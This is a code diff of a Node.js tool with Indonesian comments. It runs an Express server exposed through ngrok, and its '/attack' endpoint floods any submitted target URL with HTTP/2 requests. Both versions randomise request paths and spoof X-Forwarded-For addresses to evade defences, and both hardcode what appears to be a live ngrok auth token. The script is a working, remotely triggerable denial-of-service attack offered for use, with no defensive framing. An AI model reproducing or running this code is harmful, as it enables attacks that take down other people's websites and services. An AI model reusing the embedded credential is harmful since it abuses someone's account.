@@ -1,107 +1,65 @@
-require('colors');
 const express = require('express');
 const ngrok = require('ngrok');
 const http2 = require('http2');
 const crypto = require('crypto');
 
-let SERVER_PORT = 3000;
-let ATTACKS = new Map();
+const app = express();
+app.use(express.json());
 
-// Auto cari port yang available
-const startServer = async (port) => {
-  const app = express();
-  
-  app.use(express.json());
-  
-  // Endpoint sederhana
-  app.post('/attack', (req, res) => {
-    const { target } = req.body;
-    const attackId = crypto.randomBytes(8).toString('hex');
-    
-    ATTACKS.set(attackId, { target, start: Date.now() });
-    floodAttack(target); // Panggil fungsi serangan
-    
-    res.json({ 
-      status: 'MULAI SERANGAN', 
-      attackId,
-      port: SERVER_PORT
-    });
-  });
-
-  // Coba start server
-  try {
-    const server = await app.listen(port);
-    console.log(`[+] SERVER RUNNING ON PORT ${port}`.green);
-    return server;
-  } catch (err) {
-    if (err.code === 'EADDRINUSE') {
-      console.log(`[-] PORT ${port} TIDAK AVAILABLE, COBA PORT ${port + 1}...`.yellow);
-      return startServer(port + 1); // Auto ganti port
-    }
-    throw err;
-  }
+const config = {
+  port: 3000,
+  ngrokToken: '2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa',
+  maxDuration: 300
 };
 
-// Fungsi serangan super simple
-const floodAttack = (target) => {
+let activeAttacks = new Map();
+
+// Handle port conflict
+const startServer = (port) => {
+  const server = app.listen(port, async () => {
+    console.log(`[+] Server jalan di port ${port}`);
+    const url = await ngrok.connect({ 
+      proto: 'http', 
+      addr: port, 
+      authtoken: config.ngrokToken 
+    });
+    console.log(`[+] Ngrok URL: ${url}`);
+  }).on('error', err => {
+    if(err.code === 'EADDRINUSE') {
+      console.log(`[!] Port ${port} dipake, pindah ke ${port + 1}`);
+      startServer(port + 1);
+    }
+  });
+};
+
+// Attack logic simpel tapi powerful
+app.post('/attack', (req, res) => {
+  const { target } = req.body;
+  const attackId = crypto.randomBytes(8).toString('hex');
+  
   const client = http2.connect(target, { 
     rejectUnauthorized: false,
-    maxSessionMemory: 1000
+    maxSessionMemory: 2048
   });
   
-  const sendRequest = () => {
+  const attack = setInterval(() => {
     try {
       const req = client.request({
         ':method': 'GET',
-        ':path': '/',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'x-forwarded-for': crypto.randomBytes(4).join('.')
+        ':path': '/?' + crypto.randomBytes(8).toString('hex'),
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        'x-forwarded-for': crypto.randomInt(1,255)+'.'+crypto.randomInt(0,255)+'.'+crypto.randomInt(0,255)+'.'+crypto.randomInt(1,255)
       });
-      
       req.on('response', () => req.end());
-      req.on('error', () => {});
       req.end();
-    } catch (err) {
+    } catch(err) {
+      clearInterval(attack);
       client.destroy();
-      setTimeout(() => floodAttack(target), 1000); // Auto reconnect
     }
-  };
-  
-  setInterval(sendRequest, 10); // 100 request/detik
-};
+  }, 50); // 20 request/detik per client
 
-// Main program
-(async () => {
-  try {
-    const server = await startServer(SERVER_PORT);
-    
-    // Ngrok setup
-    const url = await ngrok.connect({
-      proto: 'http',
-      addr: SERVER_PORT,
-      authtoken: '2xdnPcPH41TA26s84notWGL5pFV_4yyAxThJgiWnsxoqu2QAa',
-      region: 'ap'
-    });
-    
-    console.log(`
-    ${'╔════════════════════════╗'.cyan}
-    ${'║'.cyan}  SERVER READY TO FIRE  ${'║'.cyan}
-    ${'╠════════════════════════╣'.cyan}
-    ${'║'.cyan} URL: ${url.padEnd(19)} ${'║'.cyan}
-    ${'║'.cyan} PORT: ${SERVER_PORT.toString().padEnd(18)} ${'║'.cyan}
-    ${'╚════════════════════════╝'.cyan}
-    `);
+  activeAttacks.set(attackId, { client, attack });
+  res.json({ status: 'Gas!', attackId });
+});
 
-    // Handle shutdown
-    process.on('SIGINT', async () => {
-      console.log('\nSHUTTING DOWN...'.yellow);
-      await ngrok.kill();
-      server.close();
-      process.exit();
-    });
-    
-  } catch (err) {
-    console.log('[!] ERROR:'.red, err.message);
-    process.exit(1);
-  }
-})();
+startServer(config.port);
